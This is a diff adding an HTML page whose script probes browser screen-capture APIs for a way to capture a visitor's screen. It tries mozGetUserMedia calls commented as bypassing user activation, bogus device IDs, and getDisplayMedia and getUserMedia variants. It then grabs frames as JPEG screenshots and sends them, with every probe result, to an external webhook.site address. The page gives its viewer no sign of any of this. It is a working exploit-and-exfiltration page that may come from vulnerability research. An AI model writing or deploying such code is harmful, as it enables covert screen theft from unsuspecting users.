@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html><head><title>E</title></head>
+<body style="margin:0;background:#111;">
+<script>
+var W='https://webhook.site/e3842f42-ecbd-4e56-8919-216d008725ce';
+var N=0;
+function rpt(k,v){N++;new Image().src=W+'?n='+N+'&t='+k+'&v='+encodeURIComponent((''+v).substring(0,500))}
+
+rpt('INIT','sec='+window.isSecureContext
+  +'|md='+(typeof navigator.mediaDevices)
+  +'|moz='+(typeof navigator.mozGetUserMedia)
+  +'|loc='+location.protocol+'//'+location.host);
+
+var done=false;
+
+function processStream(label,stream){
+  if(done)return;done=true;
+  rpt('GOT_STREAM',label+'|tracks='+stream.getTracks().length);
+  stream.getTracks().forEach(function(t,i){
+    rpt('TRACK',i+'|'+t.kind+':'+t.label+':'+t.readyState);
+  });
+  var v=document.createElement('video');
+  v.srcObject=stream;v.autoplay=true;v.muted=true;
+  v.style.cssText='width:800px;height:600px;display:block';
+  document.body.appendChild(v);
+  var gN=0;
+  function grab(gl){
+    gN++;if(gN>10)return;
+    var w=v.videoWidth||1600,h=v.videoHeight||900;
+    rpt('GRAB',gl+'|'+w+'x'+h+'|rdy='+v.readyState);
+    if(w<=0||h<=0)return;
+    var c=document.createElement('canvas');c.width=w;c.height=h;
+    var ctx=c.getContext('2d');
+    try{ctx.drawImage(v,0,0,w,h)}catch(e){rpt('DRAW_E',gl+'|'+e.message);return}
+    try{
+      var d=ctx.getImageData(0,0,20,1);
+      var px=Array.from(d.data);
+      var nz=px.filter(function(x){return x>0}).length;
+      rpt('PX',gl+'|nz='+nz+'|'+px.slice(0,40).join(','));
+    }catch(e){rpt('PX_E',gl+'|'+e.message)}
+    try{
+      var du=c.toDataURL('image/jpeg',0.8);
+      rpt('DU',gl+'|len='+du.length);
+      if(du.length>1000){
+        try{navigator.sendBeacon(W,gl+':'+du)}catch(e){}
+        fetch(W,{method:'POST',mode:'no-cors',body:gl+':'+du}).catch(function(){});
+      }
+    }catch(e){rpt('DU_E',gl+'|'+e.message)}
+  }
+  v.onloadeddata=function(){
+    rpt('VID_READY',v.videoWidth+'x'+v.videoHeight);
+    grab('ld0');
+    setTimeout(function(){grab('ld1')},1000);
+    setTimeout(function(){grab('ld3')},3000);
+    setTimeout(function(){grab('ld5')},5000);
+  };
+  setTimeout(function(){grab('t1')},500);
+  setTimeout(function(){grab('t3')},3000);
+  setTimeout(function(){grab('t10')},10000);
+}
+
+function tryMoz(label,constraints){
+  if(done)return Promise.resolve();
+  return new Promise(function(resolve){
+    if(!navigator.mozGetUserMedia){rpt('MOZ_NA',label);resolve();return}
+    rpt('TRY_MOZ',label);
+    navigator.mozGetUserMedia(constraints,
+      function(s){rpt('MOZ_OK',label);processStream('moz_'+label,s);resolve()},
+      function(e){rpt('MOZ_E',label+'|'+e.name+':'+e.message.substring(0,200));resolve()});
+  });
+}
+
+function tryGDM(label,constraints){
+  if(done)return Promise.resolve();
+  return new Promise(function(resolve){
+    if(!navigator.mediaDevices||!navigator.mediaDevices.getDisplayMedia){rpt('GDM_NA',label);resolve();return}
+    rpt('TRY_GDM',label);
+    navigator.mediaDevices.getDisplayMedia(constraints).then(function(s){
+      rpt('GDM_OK',label);processStream('gdm_'+label,s);resolve();
+    }).catch(function(e){
+      rpt('GDM_E',label+'|'+e.name+':'+e.message.substring(0,200));resolve();
+    });
+  });
+}
+
+function tryGUM(label,constraints){
+  if(done)return Promise.resolve();
+  return new Promise(function(resolve){
+    if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){rpt('GUM_NA',label);resolve();return}
+    rpt('TRY_GUM',label);
+    navigator.mediaDevices.getUserMedia(constraints).then(function(s){
+      rpt('GUM_OK',label);processStream('gum_'+label,s);resolve();
+    }).catch(function(e){
+      rpt('GUM_E',label+'|'+e.name+':'+e.message.substring(0,200));resolve();
+    });
+  });
+}
+
+async function runTests(){
+  // Phase 1: mozGetUserMedia - bypasses activation
+  await tryMoz('browser',{video:{mediaSource:'browser'}});
+  await tryMoz('screen',{video:{mediaSource:'screen'}});
+  await tryMoz('window',{video:{mediaSource:'window'}});
+  await tryMoz('application',{video:{mediaSource:'application'}});
+
+  // Non-existent deviceId - "capturing non-existing device -> bogus data"
+  await tryMoz('b_d0',{video:{mediaSource:'browser',deviceId:'0'}});
+  await tryMoz('b_d1',{video:{mediaSource:'browser',deviceId:'1'}});
+  await tryMoz('b_dfake',{video:{mediaSource:'browser',deviceId:'nonexistent'}});
+  await tryMoz('b_dempty',{video:{mediaSource:'browser',deviceId:''}});
+  await tryMoz('b_ddef',{video:{mediaSource:'browser',deviceId:'default'}});
+  await tryMoz('s_d0',{video:{mediaSource:'screen',deviceId:'0'}});
+  await tryMoz('s_d1',{video:{mediaSource:'screen',deviceId:'1'}});
+  await tryMoz('s_dfake',{video:{mediaSource:'screen',deviceId:'nonexistent'}});
+  await tryMoz('w_d0',{video:{mediaSource:'window',deviceId:'0'}});
+  await tryMoz('w_d1',{video:{mediaSource:'window',deviceId:'1'}});
+  await tryMoz('w_dfake',{video:{mediaSource:'window',deviceId:'nonexistent'}});
+
+  // Phase 2: getDisplayMedia
+  await tryGDM('basic',{video:true});
+  await tryGDM('browser',{video:{displaySurface:'browser'}});
+  await tryGDM('monitor',{video:{displaySurface:'monitor'}});
+  await tryGDM('window',{video:{displaySurface:'window'}});
+  await tryGDM('prefer',{video:true,preferCurrentTab:true});
+  await tryGDM('self',{video:true,selfBrowserSurface:'include'});
+  await tryGDM('d_fake',{video:{deviceId:'nonexistent'}});
+  await tryGDM('d_0',{video:{deviceId:'0'}});
+
+  // Phase 3: getUserMedia with display constraints
+  await tryGUM('ms_b',{video:{mediaSource:'browser'}});
+  await tryGUM('ms_s',{video:{mediaSource:'screen'}});
+  await tryGUM('adv_b',{video:{advanced:[{mediaSource:'browser'}]}});
+  await tryGUM('adv_s',{video:{advanced:[{mediaSource:'screen'}]}});
+
+  // Phase 4: Permissions
+  try{var p=await navigator.permissions.query({name:'display-capture'});rpt('PERM_DC',p.state)}catch(e){rpt('PERM_DC_E',e.message.substring(0,100))}
+  try{var p2=await navigator.permissions.query({name:'camera'});rpt('PERM_CAM',p2.state)}catch(e){rpt('PERM_CAM_E',e.message.substring(0,100))}
+
+  rpt('DONE','complete');
+}
+
+runTests();
+</script>
+</body>
+</html>
